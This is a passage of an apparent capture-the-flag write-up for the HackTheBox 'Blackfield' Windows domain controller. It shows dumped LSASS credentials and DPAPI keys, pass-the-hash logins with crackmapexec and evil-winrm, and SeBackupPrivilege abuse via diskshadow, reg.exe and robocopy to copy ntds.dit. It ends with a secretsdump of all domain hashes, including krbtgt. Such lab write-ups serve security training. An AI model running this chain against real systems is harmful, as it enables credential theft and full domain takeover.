domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-0
luid 24405
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA
        == WDIGEST [5f55]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [5f55]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 24294 (5ee6)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-0
luid 24294
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA
        == WDIGEST [5ee6]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [5ee6]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 24282 (5eda)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-1
luid 24282
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA
        == WDIGEST [5eda]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
        == WDIGEST [5eda]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 22028 (560c)
session_id 0
username
domainname
logon_server
logon_time 2020-02-23T17:57:44.959593+00:00
sid None
luid 22028
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
                DPAPI: NA

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:44.913221+00:00
sid S-1-5-18
luid 999
        == WDIGEST [3e7]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: dc01$
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [3e7]==
                username DC01$
                domainname BLACKFIELD
                password None
        == DPAPI [3e7]==
                luid 999
                key_guid 0f7e926c-c502-4cad-90fa-32b78425b5a9
                masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
                sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
        == DPAPI [3e7]==
                luid 999
                key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
                masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
                sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
        == DPAPI [3e7]==
                luid 999
                key_guid 31632c55-7a7c-4c51-9065-65469950e94e
                masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
                sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
        == DPAPI [3e7]==
                luid 999
                key_guid 7e0da320-072c-4b4a-969f-62087d9f9870
                masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
                sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed

➜  content
```

I can get the hashes of the user `Administrator` and `svc_backup`. The hash for the `Administrator` user didn't work, but the hash for the user `svc_backup` allowed me to get access to the system. 

![Untitled](/assets/images/htb-blackfield/Untitled%204.png)

I can use `crackmapexec` to check if the creds are valid. The `[+]` confirmed the account is good, so I can use the winrm module to see if this account can login to the system.

```bash
➜  content crackmapexec smb 10.129.156.28 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d 
SMB         10.129.156.28   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.156.28   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
```


```bash
➜  content crackmapexec winrm 10.129.156.28 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d 
SMB         10.129.156.28   5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.129.156.28   5985   DC01             [*] http://10.129.156.28:5985/wsman
WINRM       10.129.156.28   5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

# Shell as svc_backup

```bash
evil-winrm -i 10.129.156.28 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d              

Evil-WinRM shell v3.2

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```

# Privilege Escalation

I can take advantage of the `SeBackupPrivilege` to be able to back up the SAM and SYSTEM

```bash
Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

I used the following source and followed the instructions on how to use `diskshadow` to be able to get the SAM, SYSTEM and NTDS files.
<https://pentestlab.blog/tag/diskshadow/>

I create a file called `diskshadow.txt`

```bash
set context persistent nowriters
add volume c: alias squid22
create
expose %squid22% z:
```

From PentestLab Note: It should be noted that the `DiskShadow` binary needs to executed from the `C:\Windows\System32` path. If it is called from another path the script will not executed correctly.

```bash
diskshadow.exe /s c:\squid22.txt
```

Running the following command directly from the interpreter will list all the available volume shadow copies of the system.

```bash
diskshadow
LIST SHADOWS ALL
```

The SYSTEM registry hive should be copied as well since it contains the key to decrypt the contents of the NTDS file.

```bash
reg.exe save hklm\system z:\squid22\system.bak
```

Example:

![Untitled](/assets/images/htb-blackfield/Untitled%205.png)

```bash
unix2dos diskshadow.txt 
unix2dos: converting file diskshadow.txt to DOS format...
```

```bash
*Evil-WinRM* PS C:\Temp> diskshadow.exe /s c:\Temp\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  2/12/2022 7:05:38 AM

-> set context persistent nowriters
-> add volume c: alias squid22
-> create
Alias squid22 for shadow ID {88c62288-c439-47a8-93be-a1cd48c934d6} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {b1798dea-a541-4292-97bb-8bb8575c3b12} set as environment variable.

Querying all shadow copies with the shadow copy set ID {b1798dea-a541-4292-97bb-8bb8575c3b12}

        * Shadow copy ID = {88c62288-c439-47a8-93be-a1cd48c934d6}               %squid22%
                - Shadow copy set: {b1798dea-a541-4292-97bb-8bb8575c3b12}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 2/12/2022 7:05:39 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %squid22% z:
-> %squid22% = {88c62288-c439-47a8-93be-a1cd48c934d6}
The shadow copy was successfully exposed as z:\.
->
```

![Untitled](/assets/images/htb-blackfield/Untitled%206.png)

Below you can see how I was able to make a backup of the `SYSTEM` and `SAM` files, but for the `NTDS` file, I used `robocopy`.
```bash
*Evil-WinRM* PS C:\Temp> reg.exe save hklm\system c:\Temp\system.bak                                                         
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> reg.exe save hklm\sam c:\Temp\sam.bak                                                               
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> robocopy /b z:\Windows\NTDS . ntds.dit
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Saturday, February 12, 2022 7:13:23 AM
   Source : z:\Windows\NTDS\
     Dest : C:\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\Windows\NTDS\
            New File              18.0 m        ntds.dit
```

I used `evil-winrm` to download all the files from the target and then used `secretsdump.py` from impacket to dump the hashes.
```bash
secretsdump.py LOCAL -system system.bak -ntds ntds.dit
Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation                                       
                                                                                                                             
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393                                                                
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                
[*] Searching for pekList, be patient                                                                                        
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c                                                            
[*] Reading and decrypting hashes from ntds.dit                                                                              
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::                                       
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                               
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:3774928fe55833e6c62abdc233f47a7b:::                                              
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::                                              
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::                                          
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

![Untitled](/assets/images/htb-blackfield/Untitled%207.png)

```bash
*Evil-WinRM* PS C:\Users\Administrator> cat "C:/Users/Administrator/Desktop/root.txt"
4375a629c7c67c8e29db269060c955cb
```

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cat "C:/Users/svc_backup/Desktop/user.txt"
3920bb317a0bef51027e2852be64b543
*Evil-WinRM* PS C:\Users\svc_backup\Desktop>
```
